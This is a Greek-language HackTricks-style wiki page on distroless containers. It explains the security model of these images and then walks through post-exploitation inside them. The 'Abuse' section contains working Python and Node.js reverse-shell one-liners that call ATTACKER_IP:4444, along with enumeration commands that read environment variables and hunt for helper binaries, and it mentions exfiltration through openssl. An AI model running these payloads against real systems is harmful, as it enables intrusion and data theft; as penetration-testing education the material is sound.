# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Ένα **distroless** container image περιλαμβάνει τα **ελάχιστα στοιχεία runtime που απαιτούνται για την εκτέλεση μίας συγκεκριμένης εφαρμογής**, αφαιρώντας σκόπιμα τα συνήθη εργαλεία διανομής, όπως package managers, shells και μεγάλα σύνολα γενικών βοηθητικών προγραμμάτων userland. Στην πράξη, τα distroless images συχνά περιέχουν μόνο το binary ή το runtime της εφαρμογής, τις shared libraries της, τα certificate bundles και μια πολύ μικρή διάταξη filesystem. <sup>[[1]](#references)</sup>

Το distroless δεν είναι ένα νέο primitive απομόνωσης του kernel. Το distroless είναι μια **στρατηγική σχεδιασμού image**. Αλλάζει όσα είναι διαθέσιμα **μέσα** στο filesystem του container, όχι τον τρόπο με τον οποίο ο kernel απομονώνει το container. Αυτή η διάκριση έχει σημασία, επειδή το distroless ενισχύει την ασφάλεια του περιβάλλοντος κυρίως περιορίζοντας όσα μπορεί να χρησιμοποιήσει ένας attacker αφού αποκτήσει code execution. Δεν αντικαθιστά τα namespaces, το seccomp, τα capabilities, το AppArmor, το SELinux ή οποιονδήποτε άλλο μηχανισμό απομόνωσης runtime.

## Γιατί Υπάρχει το Distroless

Τα distroless images χρησιμοποιούνται κυρίως για να μειώσουν:

- το μέγεθος του image
- την επιχειρησιακή πολυπλοκότητα του image
- τον αριθμό των packages και των binaries που θα μπορούσαν να περιέχουν vulnerabilities
- τον αριθμό των εργαλείων post-exploitation που είναι διαθέσιμα σε έναν attacker από προεπιλογή

Γι' αυτό τα distroless images είναι δημοφιλή σε production deployments εφαρμογών. Ένα container που δεν περιέχει shell, package manager και σχεδόν κανένα γενικό εργαλείο είναι συνήθως ευκολότερο να διαχειριστεί επιχειρησιακά και δυσκολότερο να χρησιμοποιηθεί καταχρηστικά με διαδραστικό τρόπο μετά από compromise.

Παραδείγματα γνωστών οικογενειών images τύπου distroless είναι:

- Τα distroless images της Google <sup>[[1]](#references)</sup>
- Τα hardened/minimal images της Chainguard <sup>[[2]](#references)</sup>

## Τι Δεν Σημαίνει το Distroless

Ένα distroless container **δεν είναι**:

- αυτόματα rootless
- αυτόματα μη προνομιούχο
- αυτόματα μόνο για ανάγνωση
- αυτόματα προστατευμένο με seccomp, AppArmor ή SELinux
- αυτόματα ασφαλές από container escape

Εξακολουθεί να είναι δυνατό να εκτελεστεί ένα distroless image με `--privileged`, κοινή χρήση host namespaces, επικίνδυνα bind mounts ή προσαρτημένο runtime socket. Σε αυτό το σενάριο, το image μπορεί να είναι minimal, αλλά το container εξακολουθεί να είναι καταστροφικά ανασφαλές. Το distroless αλλάζει την **επιφάνεια επίθεσης του userland**, όχι το **όριο εμπιστοσύνης του kernel**.

## Συνήθη Λειτουργικά Χαρακτηριστικά

Όταν κάνετε compromise σε ένα distroless container, συνήθως παρατηρείτε πρώτα ότι οι συνηθισμένες παραδοχές δεν ισχύουν πλέον. Μπορεί να μην υπάρχει `sh`, `bash`, `ls`, `id`, `cat` και, μερικές φορές, ούτε καν περιβάλλον βασισμένο σε libc που να συμπεριφέρεται όπως αναμένει το συνηθισμένο tradecraft σας. Αυτό επηρεάζει τόσο την επίθεση όσο και την άμυνα, επειδή η έλλειψη εργαλείων αλλάζει τον τρόπο αποσφαλμάτωσης, απόκρισης σε περιστατικά και post-exploitation.

Τα συνηθέστερα μοτίβα είναι:

- υπάρχει το runtime της εφαρμογής, αλλά ελάχιστα άλλα
- τα shell-based payloads αποτυγχάνουν επειδή δεν υπάρχει shell
- οι συνήθεις one-liners απαρίθμησης αποτυγχάνουν επειδή λείπουν τα βοηθητικά binaries
- συχνά υπάρχουν επίσης προστασίες filesystem, όπως read-only rootfs ή `noexec` σε εγγράψιμες θέσεις tmpfs

Αυτός ο συνδυασμός είναι συνήθως ο λόγος που γίνεται λόγος για «weaponizing distroless».

## Distroless Και Post-Exploitation

Η βασική επιθετική πρόκληση σε ένα distroless περιβάλλον δεν είναι πάντα το αρχικό RCE. Συχνά είναι ό,τι ακολουθεί. Αν το workload στο οποίο έγινε exploit παρέχει code execution σε ένα language runtime όπως Python, Node.js, Java ή Go, μπορεί να μπορείτε να εκτελέσετε αυθαίρετη λογική, αλλά όχι μέσω των συνηθισμένων shell-centric workflows που είναι κοινά σε άλλους Linux στόχους.

Αυτό σημαίνει ότι το post-exploitation συχνά ακολουθεί μία από τρεις κατευθύνσεις:

1. **Χρησιμοποιήστε απευθείας το υπάρχον language runtime** για να απαριθμήσετε το περιβάλλον, να ανοίξετε sockets, να διαβάσετε αρχεία ή να προετοιμάσετε πρόσθετα payloads.
2. **Φορτώστε τα δικά σας εργαλεία στη μνήμη** αν το filesystem είναι μόνο για ανάγνωση ή οι εγγράψιμες θέσεις έχουν προσαρτηθεί με `noexec`.
3. **Καταχραστείτε υπάρχοντα binaries που περιλαμβάνονται ήδη στο image** αν η εφαρμογή ή οι εξαρτήσεις της περιλαμβάνουν κάτι απροσδόκητα χρήσιμο.

## Abuse

### Απαριθμήστε Το Runtime Που Έχετε Ήδη

Σε πολλά distroless containers δεν υπάρχει shell, αλλά εξακολουθεί να υπάρχει runtime εφαρμογής. Αν ο στόχος είναι μια υπηρεσία Python, υπάρχει Python. Αν ο στόχος είναι Node.js, υπάρχει Node. Αυτό συχνά παρέχει αρκετή λειτουργικότητα για να απαριθμήσετε αρχεία, να διαβάσετε environment variables, να ανοίξετε reverse shells και να προετοιμάσετε in-memory execution χωρίς να καλέσετε ποτέ το `/bin/sh`.

Ένα απλό παράδειγμα με Python:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Ένα απλό παράδειγμα με Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Επιπτώσεις:

- ανάκτηση μεταβλητών περιβάλλοντος, που συχνά περιλαμβάνουν διαπιστευτήρια ή endpoints υπηρεσιών
- καταγραφή του συστήματος αρχείων χωρίς `/bin/ls`
- εντοπισμός εγγράψιμων διαδρομών και προσαρτημένων secrets

### Διαδραστικό Runtime χωρίς `/bin/sh`

Αν το image δεν περιέχει `sh` ή `bash`, ένα κλασικό reverse shell βασισμένο σε shell αποτυγχάνει. Σε αυτή την περίπτωση, εκθέστε μια διαδραστική συνεδρία στο εγκατεστημένο language runtime αντί να εκκινήσετε ένα ανύπαρκτο shell.

Για παράδειγμα, αυτό το Python payload ανακατευθύνει μια διαδραστική κονσόλα Python μέσω ενός socket:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Η αντίστοιχη προσέγγιση σε Node.js μπορεί να αξιολογεί JavaScript που λαμβάνεται μέσω socket. Πρόκειται για JavaScript REPL, όχι για κέλυφος λειτουργικού συστήματος· οι λειτουργίες συστήματος αρχείων, διεργασιών και δικτύωσης πρέπει να εκτελούνται μέσω των API του Node:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Και τα δύο παραδείγματα απαιτούν εξερχόμενη συνδεσιμότητα και διαθέσιμο διερμηνευτή, και παρέχουν μόνο τις λειτουργίες που εκθέτει ο διερμηνευτής.

Αν η εικόνα περιλαμβάνει απροσδόκητα το `/bin/sh`, τα κλασικά shell payloads με τη βοήθεια διερμηνευτή εξακολουθούν να είναι χρήσιμα. Παρουσιάζονται ξεχωριστά, επειδή δεν είναι πραγματικά απαλλαγμένα από shell:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Το παλαιότερο μοτίβο command-loop σε Python είναι επίσης χρήσιμο όταν υπάρχει το `/bin/sh`, αλλά ένα interactive PTY δεν είναι πρακτικό. Διατηρείται εδώ με την πραγματική του εξάρτηση να δηλώνεται ρητά: το `subprocess.run(..., shell=True)` καλεί το system shell και επομένως **δεν** είναι τεχνική χωρίς shell.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Πλήρες παράδειγμα: Python command loop χωρίς shell

Αν το image έχει Python αλλά καθόλου shell, ένα τοπικό Python REPL μπορεί και πάλι να χρησιμοποιηθεί για επιθεώρηση του συστήματος αρχείων, του περιβάλλοντος και του δικτύου:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Αυτός ο βρόχος δεν καλεί το `/bin/sh`. Αξιολογεί απευθείας εκφράσεις και εντολές Python, επομένως οι λειτουργίες πρέπει να χρησιμοποιούν Python APIs αντί για εντολές shell. Παρά αυτόν τον περιορισμό, μπορεί να προσφέρει μεγάλο μέρος των δυνατοτήτων ενός βασικού shell: απαρίθμηση συστήματος αρχείων και περιβάλλοντος, πρόσβαση σε δεδομένα, δραστηριότητα δικτύου και προετοιμασία πρόσθετων payloads μέσω του εγκατεστημένου runtime.

### Εκτέλεση εργαλείων στη μνήμη

Οι εικόνες distroless συχνά συνδυάζονται με:

- `readOnlyRootFilesystem: true`
- εγγράψιμο αλλά `noexec` tmpfs, όπως το `/dev/shm`
- έλλειψη εργαλείων διαχείρισης πακέτων

Αυτός ο συνδυασμός καθιστά αναξιόπιστες τις κλασικές ροές εργασίας «κατέβασε ένα binary στον δίσκο και εκτέλεσέ το». Σε αυτές τις περιπτώσεις, οι τεχνικές εκτέλεσης στη μνήμη γίνονται η βασική λύση.

Η ειδική σελίδα γι’ αυτό είναι:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Οι πιο σχετικές τεχνικές εκεί είναι:

- `memfd_create` + `execve` μέσω scripting runtimes <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Σε μια υπηρεσία Python, Node.js ή PHP, το αρχικό σημείο εισόδου μπορεί να είναι ένα σφάλμα της εφαρμογής, όπως template injection, prototype pollution ή unsafe evaluation. Αν αυτό οδηγήσει σε εκτέλεση κώδικα μέσα στη διεργασία, μια τεχνική `/proc/self/mem` μπορεί να εκτελέσει έναν loader χωρίς shell ή εκτελέσιμο αρχείο στον δίσκο. Η εκτέλεση εξακολουθεί να γίνεται με την ταυτότητα της διεργασίας του container· για διαφυγή από το container απαιτείται αδυναμία σε ξεχωριστό όριο runtime ή host. Δείτε τις [τεχνικές read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) για τις προϋποθέσεις.

### Υπάρχοντα binaries ήδη στην εικόνα

Ορισμένες εικόνες distroless εξακολουθούν να περιέχουν binaries απαραίτητα για τη λειτουργία, τα οποία γίνονται χρήσιμα μετά από παραβίαση. Ένα παράδειγμα που παρατηρείται συχνά είναι το `openssl`, επειδή οι εφαρμογές μερικές φορές το χρειάζονται για εργασίες σχετικές με κρυπτογραφία ή TLS.

Ένα γρήγορο μοτίβο αναζήτησης είναι:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Αν υπάρχει το `openssl`, μπορεί να χρησιμοποιηθεί για:

- εξερχόμενες συνδέσεις TLS
- data exfiltration μέσω επιτρεπόμενου καναλιού egress
- προετοιμασία δεδομένων payload μέσω encoded/encrypted blobs

Η ακριβής κατάχρηση εξαρτάται από το τι είναι πραγματικά εγκατεστημένο, αλλά η γενική ιδέα είναι ότι το distroless δεν σημαίνει «καθόλου εργαλεία»· σημαίνει «πολύ λιγότερα εργαλεία από μια κανονική image διανομής».

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να διαπιστωθεί αν η image είναι όντως distroless στην πράξη και ποια runtime ή helper binaries εξακολουθούν να είναι διαθέσιμα για post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Τι είναι ενδιαφέρον εδώ:

- Αν δεν υπάρχει shell, αλλά είναι διαθέσιμο ένα runtime όπως το Python ή το Node, το post-exploitation θα πρέπει να στραφεί σε εκτέλεση μέσω runtime.
- Αν το root filesystem είναι μόνο για ανάγνωση και το `/dev/shm` είναι εγγράψιμο αλλά `noexec`, οι τεχνικές εκτέλεσης στη μνήμη γίνονται πολύ πιο σχετικές.
- Αν υπάρχουν βοηθητικά binaries όπως τα `openssl`, `busybox` ή `java`, μπορεί να προσφέρουν αρκετές δυνατότητες για την εξασφάλιση περαιτέρω πρόσβασης.

## Προεπιλογές Runtime

| Τύπος image / πλατφόρμας | Προεπιλεγμένη κατάσταση | Συνήθης συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Images τύπου Google distroless | Εξ ορισμού ελάχιστο userland | Χωρίς shell, χωρίς package manager, μόνο εξαρτήσεις εφαρμογής/runtime | προσθήκη επιπέδων debugging, sidecar shells, αντιγραφή του busybox ή εργαλείων |
| Ελάχιστα images Chainguard | Εξ ορισμού ελάχιστο userland | Μειωμένη επιφάνεια πακέτων, συχνά εστιασμένα σε ένα runtime ή service | χρήση των `:latest-dev` ή debug variants, αντιγραφή εργαλείων κατά το build |
| Workloads Kubernetes που χρησιμοποιούν distroless images | Εξαρτάται από τη ρύθμιση του Pod | Το distroless επηρεάζει μόνο το userland· η στάση ασφαλείας του Pod εξακολουθεί να εξαρτάται από το spec του Pod και τις προεπιλογές του runtime | προσθήκη ephemeral debug containers, host mounts, ρυθμίσεις privileged Pod |
| Docker / Podman που εκτελούν distroless images | Εξαρτάται από τα run flags | Ελάχιστο filesystem, αλλά η ασφάλεια του runtime εξακολουθεί να εξαρτάται από τα flags και τη ρύθμιση του daemon | `--privileged`, κοινή χρήση host namespaces, mounts του runtime socket, εγγράψιμα host binds |

Το βασικό σημείο είναι ότι το distroless είναι **ιδιότητα του image**, όχι προστασία του runtime. Η αξία του προκύπτει από τη μείωση των διαθέσιμων στοιχείων μέσα στο filesystem μετά από compromise. Τα multi-stage builds είναι ένας συνήθης τρόπος για να κρατούνται τα εργαλεία build εκτός του τελικού image. <sup>[[3]](#references)</sup>

## Σχετικές σελίδες

Για παρακάμψεις προστασίας filesystem και εκτέλεσης στη μνήμη που χρειάζονται συχνά σε περιβάλλοντα distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Για κατάχρηση container runtime, socket και mount που εξακολουθεί να ισχύει για workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless container images](https://github.com/GoogleContainerTools/distroless)
- [2] [Τεκμηρίωση Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Builds πολλαπλών σταδίων](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
